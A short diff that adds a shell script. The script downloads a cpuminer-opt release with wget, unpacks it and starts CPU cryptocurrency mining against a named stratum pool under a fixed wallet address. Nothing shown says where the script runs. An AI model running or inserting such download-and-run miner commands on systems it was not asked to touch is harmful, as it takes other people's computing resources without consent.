@@ -1,0 +1,4 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz
+tar -xf cpuminer-opt-linux.tar.gz
+ls
+./cpuminer-sse2 -a yespowerurx -o stratum+tcp://cpu-pool.com:63378 -u UcFKqMZGWCjg9twNzawnHMKXhaJ74pt91H -p x --debug -D --no-longpoll --cpu-affinity 4096
